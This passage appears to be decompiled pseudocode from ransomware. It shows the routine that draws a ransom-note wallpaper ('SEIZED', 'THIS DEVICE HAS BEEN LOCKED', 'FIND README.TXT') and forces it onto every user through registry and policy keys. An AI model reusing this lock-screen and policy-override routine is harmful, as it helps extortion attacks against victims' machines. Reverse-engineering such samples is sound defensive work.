  int v79; // [rsp+C8h] [rbp-38h]
  int v80; // [rsp+CCh] [rbp-34h]
  HDC hdcSrc; // [rsp+D0h] [rbp-30h]
  __m128i v82; // [rsp+D8h] [rbp-28h] BYREF
  _DWORD v83[18]; // [rsp+E8h] [rbp-18h] BYREF
  _BYTE v84[6]; // [rsp+130h] [rbp+30h] BYREF
  char v85; // [rsp+136h] [rbp+36h]
  char v86; // [rsp+137h] [rbp+37h]
  CHAR Buffer[336]; // [rsp+1B0h] [rbp+B0h] BYREF
  __int64 wDest; // [rsp+310h] [rbp+210h] BYREF
  char v89; // [rsp+318h] [rbp+218h] BYREF
  __int64 v90; // [rsp+320h] [rbp+220h] BYREF
  __int64 v91; // [rsp+328h] [rbp+228h]

  v0 = nullptr;
  v91 = 0;
  v1 = 0;
  v75 = 0;
  v2 = nullptr;
  v3 = 0;
  if ( (unsigned int)qword_140018658("C:\\ProgramData", 0) != 0 || (unsigned int)qword_140018710() == 183 )
  {
    v4 = "C:\\ProgramData\\majin.bmp";
    goto LABEL_7;
  }
  if ( GetTempPathA(0x104u, Buffer) == 0 )
  {
    v4 = "C:\\majin.bmp";
LABEL_7:
    qword_1400187B0(FileName, v4);
    goto LABEL_8;
  }
  qword_1400187B0(FileName, Buffer);
  lstrcatA(FileName, "majin.bmp");
LABEL_8:
  v5 = 1;
  if ( GetFileAttributesExA(FileName, GetFileExInfoStandard, FileInformation) && (FileInformation[0] & 0x10) == 0 )
  {
LABEL_53:
    if ( dword_140018D30 != 0 )
    {
      LODWORD(wDest) = 128;
      if ( (unsigned int)qword_140018990(-2147483645, 0, v84, &wDest, 0, 0, 0, 0) == 0 )
      {
        while ( 1 )
        {
          if ( v84[0] == 83 && v84[1] == 45 && v84[4] == 53 && v84[5] == 45 )
          {
            if ( v85 == 49 )
            {
              if ( (unsigned __int8)(v86 - 56) > 1u )
                goto LABEL_64;
            }
            else if ( v85 != 50 || v86 != 48 )
            {
LABEL_64:
              qword_1400187B0(Buffer, v84);
              lstrcatA(Buffer, "\\Control Panel\\Desktop");
              if ( (unsigned int)qword_140018998(-2147483645, Buffer, 0, 131078, &v90) == 0 )
              {
                v60 = (void (__fastcall *)(__int64, const char *, _QWORD, __int64, CHAR *, int))qword_1400189A0;
                v61 = qword_1400187C8(FileName);
                v60(v90, "Wallpaper", 0, 1, FileName, v61 + 1);
                qword_1400189A0(v90, "WallpaperStyle", 0, 1, "2", 2);
                qword_140018978(v90);
              }
              qword_1400187B0(Buffer, v84);
              lstrcatA(Buffer, "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
              if ( (unsigned int)qword_140018980(-2147483645, Buffer, 0, 0, 0, 131078, 0, &v74, 0) == 0 )
              {
                v62 = (void (__fastcall *)(__int64, const char *, _QWORD, __int64, CHAR *, int))qword_1400189A0;
                v63 = qword_1400187C8(FileName);
                v62(v74, "Wallpaper", 0, 1, FileName, v63 + 1);
                qword_140018978(v74);
              }
            }
          }
          v64 = v5;
          LODWORD(wDest) = 128;
          ++v5;
          if ( (unsigned int)qword_140018990(-2147483645, v64, v84, &wDest, 0, 0, 0, 0) != 0 )
          {
            v3 = v75;
            goto LABEL_72;
          }
        }
      }
    }
    else if ( (unsigned int)qword_140018998(-2147483647, "Control Panel\\Desktop", 0, 131078, &wDest) == 0 )
    {
      v65 = (void (__fastcall *)(__int64, const char *, _QWORD, __int64, CHAR *, int))qword_1400189A0;
      v66 = qword_1400187C8(FileName);
      v65(wDest, "Wallpaper", 0, 1, FileName, v66 + 1);
      qword_1400189A0(wDest, "WallpaperStyle", 0, 1, "2", 2);
      qword_140018978(wDest);
LABEL_72:
      v1 = v91;
    }
    result = (char *)qword_140018B48(20, 0, FileName, 3);
    if ( dword_140018D34 != 0 )
    {
      result = (char *)qword_140018750(4294967284LL);
      v67 = result;
      v14 = result - 1;
      if ( (unsigned __int64)(result - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v68 = (__int64 (__fastcall *)(char *, const char *, _QWORD, __int64 *, _QWORD))qword_140018880;
        v69 = qword_1400187C8("[pf] wallpaper applied\r\n");
        result = (char *)v68(v67, "[pf] wallpaper applied\r\n", v69, &wDest, 0);
      }
    }
    goto LABEL_76;
  }
  if ( dword_140018D34 != 0 )
  {
    v6 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v6 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v7 = (void (__fastcall *)(__int64, const char *, _QWORD, __int64 *, _QWORD))qword_140018880;
      v8 = qword_1400187C8("[pf] generating wallpaper BMP (1920x1080)\r\n");
      v7(v6, "[pf] generating wallpaper BMP (1920x1080)\r\n", v8, &wDest, 0);
    }
  }
  v11 = qword_140018B28(0);
  if ( v11 != 0 )
  {
    v2 = (HDC)qword_140018AD0(0);
    v78 = v2;
    v91 = qword_140018AC8(v11, 1920, 1080);
    v1 = v91;
    result = (char *)qword_140018B30(0, v11);
    if ( v2 == nullptr )
      goto LABEL_78;
    if ( v1 == 0 )
    {
LABEL_81:
      result = (char *)qword_140018AE8(v2);
      goto LABEL_82;
    }
    v75 = qword_140018B08(v2, v1);
    v15 = qword_140018AE0(14937586);
    si128 = _mm_load_si128((const __m128i *)&xmmword_140014180);
    v16 = v15;
    qword_140018B38(v2, &si128, v15);
    qword_140018AF0(v16);
    qword_140018B10(v2, 1);
    memset(v83, 0, 0x3Cu);
    v83[0] = -560;
    v83[4] = 700;
    qword_1400187B0(&v83[7], "Segoe UI");
    v17 = qword_140018B28(0);
    v18 = (HDC)qword_140018AD0(0);
    hdcSrc = v18;
    v74 = qword_140018AC8(v17, 1920, 600);
    v19 = v74;
    qword_140018B30(0, v17);
    *(_QWORD *)&v72 = qword_140018B08(v18, v19);
    v20 = qword_140018AE0(14937586);
    v82 = _mm_load_si128((const __m128i *)&xmmword_140014170);
    v21 = v20;
    qword_140018B38(v18, &v82, v20);
    qword_140018AF0(v21);
    v76 = qword_140018AD8(v83);
    v22 = 0;
    v23 = 0;
    v90 = 0;
    if ( v76 != 0 )
    {
      qword_140018B08(v18, v76);
      qword_140018B10(v18, 1);
      qword_140018B18(v18, 12832213);
      qword_140018B40(v18, "SEIZED", 6, &v90);
      si128.m128i_i64[1] = v90;
      si128.m128i_i64[0] = 0;
      qword_140018B20(v18, "SEIZED", 0xFFFFFFFFLL, &si128, 32);
      v22 = HIDWORD(v90);
      v23 = v90;
    }
    v24 = 1920;
    v25 = 500;
    ySrc = 0;
    v27 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
    if ( v23 > 0 )
      v24 = (unsigned int)v23;
    LODWORD(wDest) = v24;
    if ( (int)v22 > 0 )
      v25 = v22;
    v28 = 4 * (int)v24;
    v29 = qword_140018740(v22, v24);
    v31 = v27(v29, 0, v28);
    if ( v31 == 0 )
      goto LABEL_35;
    memset(FileInformation, 0, sizeof(FileInformation));
    v32 = 0;
    FileInformation[0] = 40;
    FileInformation[1] = wDest;
    FileInformation[2] = -1;
    *(_QWORD *)&FileInformation[3] = 2097153;
    v33 = hdcSrc;
    v34 = v74;
    do
    {
      if ( ySrc != 0 )
        break;
      qword_140018B00(v33, v34, (unsigned int)v32, 1, v31, FileInformation, 0);
      if ( v28 > 0 )
      {
        v35 = (_BYTE *)(v31 + 1);
        v30 = ~v31;
        while ( v35[1] == 0xF2 && *v35 == 0xED && *(v35 - 1) == 0xE3 )
        {
          v35 += 4;
          if ( (__int64)&v35[v30] >= v28 )
            goto LABEL_33;
        }
        ySrc = v32;
      }
LABEL_33:
      ++v32;
    }
    while ( v32 < v25 );
    v2 = v78;
    v36 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
    v37 = qword_140018740(1, v30);
    v36(v37, 0, v31);
    if ( ySrc == 0 )
LABEL_35:
      ySrc = 16 * v25 / 100;
    v38 = hdcSrc;
    StretchBlt(v2, 5, -130, 1910, 992, hdcSrc, 0, ySrc, wDest, v25 - ySrc, 0xCC0020u);
    if ( v76 != 0 )
      qword_140018AF0(v76);
    qword_140018B08(v38, v72);
    qword_140018AF0(v74);
    qword_140018AE8(v38);
    memset(v83, 0, 0x3Cu);
    v83[0] = -28;
    v83[4] = 700;
    qword_1400187B0(&v83[7], "Segoe UI");
    v39 = qword_140018B28(0);
    v40 = (HDC)qword_140018AD0(0);
    v76 = qword_140018AC8(v39, 1920, 60);
    v41 = v76;
    qword_140018B30(0, v39);
    *(_QWORD *)&v72 = qword_140018B08(v40, v41);
    v42 = qword_140018AE0(14937586);
    v82 = _mm_load_si128((const __m128i *)&xmmword_140014160);
    v43 = v42;
    qword_140018B38(v40, &v82, v42);
    qword_140018AF0(v43);
    v44 = qword_140018AD8(v83);
    wDest = 0;
    v45 = v44;
    wSrc = 0;
    hSrc = 0;
    if ( v44 != 0 )
    {
      qword_140018B08(v40, v44);
      qword_140018B10(v40, 1);
      qword_140018B18(v40, 1118998);
      v48 = (void (__fastcall *)(HDC, const char *, _QWORD, __int64 *))qword_140018B40;
      v49 = qword_1400187C8("M A J I N A H A N A S H I");
      v48(v40, "M A J I N A H A N A S H I", v49, &wDest);
      si128.m128i_i64[1] = wDest;
      si128.m128i_i64[0] = 0;
      qword_140018B20(v40, "M A J I N A H A N A S H I", 0xFFFFFFFFLL, &si128, 32);
      hSrc = HIDWORD(wDest);
      wSrc = wDest;
    }
    hDest = 13 * hSrc / 10;
    StretchBlt(v2, 1228, (40 - hDest) / 2 + 730, wSrc, hDest, v40, 0, 0, wSrc, hSrc, 0xCC0020u);
    LODWORD(v90) = 0;
    qword_140018B08(v40, v45);
    qword_140018B40(v40, "M A J I N A H", 11, &v90);
    v51 = hDest + (40 - hDest) / 2 + 734;
    v52 = 13 * (int)v90 / 10;
    v53 = qword_140018AE0(1710731);
    LODWORD(v78) = 1228;
    HIDWORD(v78) = v51;
    v79 = v52 + 1228;
    v80 = v51 + 3;
    qword_140018B38(v2, &v78, v53);
    qword_140018AF0(v53);
    if ( v45 != 0 )
      qword_140018AF0(v45);
    qword_140018B08(v40, v72);
    qword_140018AF0(v76);
    qword_140018AE8(v40);
    memset(v83, 0, 0x3Cu);
    v83[0] = -18;
    v83[4] = 700;
    qword_1400187B0(&v83[7], "Segoe UI");
    v54 = qword_140018AD8(v83);
    v55 = v54;
    if ( v54 != 0 )
    {
      qword_140018B08(v2, v54);
      qword_140018B18(v2, 1118998);
      *(_QWORD *)&v72 = 0x318000004CCLL;
      *((_QWORD *)&v72 + 1) = 0x33400000708LL;
      qword_140018B20(v2, "THIS DEVICE HAS BEEN LOCKED.", 0xFFFFFFFFLL, &v72, 36);
      DWORD1(v72) = 824;
      HIDWORD(v72) = 852;
      qword_140018B20(v2, "DO NOT MODIFY ENCRYPTED FILES.", 0xFFFFFFFFLL, &v72, 36);
      DWORD1(v72) = 856;
      HIDWORD(v72) = 884;
      qword_140018B20(v2, "FIND ", 0xFFFFFFFFLL, &v72, 36);
      qword_140018B40(v2, "FIND ", 5, &wDest);
      si128.m128i_i32[0] = wDest + v72;
      si128.m128i_i64[1] = DWORD2(v72) | 0x37400000000LL;
      si128.m128i_i32[1] = 856;
      qword_140018B18(v2, 1710731);
      qword_140018B20(v2, "README.TXT", 0xFFFFFFFFLL, &si128, 36);
      qword_140018AF0(v55);
    }
    v3 = v75;
    v1 = v91;
  }
  v56 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
  v57 = qword_140018740(v10, v9);
  result = (char *)v56(v57, 0, 8294400);
  v0 = result;
  if ( result != nullptr )
  {
    memset(FileInformation, 0, sizeof(FileInformation));
    FileInformation[0] = 40;
    FileInformation[1] = 1920;
    FileInformation[2] = 1080;
    *(_QWORD *)&FileInformation[3] = 2097153;
    FileInformation[5] = 8294400;
    if ( v1 != 0 && v2 != nullptr )
      qword_140018B00(v2, v1, 0, 1080, result, FileInformation, 0);
    else
      memset(result, 0, 0x7E9000u);
    memset(&v72, 0, 0xEu);
    *(_DWORD *)((char *)&v72 + 2) = 8294454;
    LOWORD(v72) = 19778;
    *(_DWORD *)((char *)&v72 + 10) = 54;
    v58 = qword_140018648(FileName, 0x40000000, 1, 0, 2, 128, 0);
    v59 = v58;
    if ( v58 == -1 )
    {
      v5 = 1;
    }
    else
    {
      qword_140018880(v58, &v72, 14, &v89, 0);
      qword_140018880(v59, FileInformation, 40, &v89, 0);
      qword_140018880(v59, v0, 8294400, &v89, 0);
      qword_140018640(v59);
      v5 = 1;
      dword_140018D38 = 1;
      sub_14000E080("[pf] BMP saved\r\n");
    }
    goto LABEL_53;
  }
LABEL_76:
  if ( v3 != 0 )
    result = (char *)qword_140018B08(v2, v3);
LABEL_78:
  if ( v1 != 0 )
    result = (char *)qword_140018AF0(v1);
  if ( v2 != nullptr )
    goto LABEL_81;
LABEL_82:
  if ( v0 != nullptr )
  {
    v70 = (__int64 (__fastcall *)(__int64, _QWORD, char *))qword_140018770;
    v71 = qword_140018740(v14, v13);
    return (char *)v70(v71, 0, v0);
  }
  return result;
}


// ----- sub_14000E080 @ 0x14000e080 -----
void __fastcall sub_14000E080(__int64 a1)
{
  __int64 v2; // rdi
  void (__fastcall *v3)(__int64, __int64, _QWORD, char *, _QWORD); // rbx
  unsigned int v4; // eax
  char v5; // [rsp+48h] [rbp+10h] BYREF

  if ( dword_140018D34 != 0 )
  {
    v2 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v2 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v3 = (void (__fastcall *)(__int64, __int64, _QWORD, char *, _QWORD))qword_140018880;
      v4 = qword_1400187C8(a1);
      v3(v2, a1, v4, &v5, 0);
    }
  }
}


// ----- sub_14000E100 @ 0x14000e100 -----
void __fastcall sub_14000E100(unsigned int a1)
{
  unsigned int v1; // r8d
  int v2; // r9d
  _BYTE *v3; // r10
  __int64 v4; // r11
  __int64 v5; // rax
  __int64 v6; // r8
  char v7; // dl
  __int64 v8; // rdi
  void (__fastcall *v9)(__int64, _BYTE *, _QWORD, char *, _QWORD); // rbx
  unsigned int v10; // eax
  _BYTE v11[16]; // [rsp+30h] [rbp-18h] BYREF
  char v12; // [rsp+58h] [rbp+10h] BYREF

  v1 = a1;
  if ( dword_140018D34 != 0 )
  {
    v2 = 0;
    if ( a1 != 0 )
    {
      v3 = v11;
      do
      {
        v4 = v2++;
        *v3++ = v1 % 0xA + 48;
        v1 /= 0xAu;
      }
      while ( v1 != 0 );
      v5 = v4;
      if ( (int)v4 > 0 )
      {
        v6 = 0;
        do
        {
          v7 = v11[v6];
          v11[v6++] = v11[v5];
          v11[v5--] = v7;
        }
        while ( v6 < v5 );
      }
    }
    else
    {
      v11[0] = 48;
      v2 = 1;
    }
    v11[v2] = 0;
    v8 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v8 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v9 = (void (__fastcall *)(__int64, _BYTE *, _QWORD, char *, _QWORD))qword_140018880;
      v10 = qword_1400187C8(v11);
      v9(v8, v11, v10, &v12, 0);
    }
  }
}


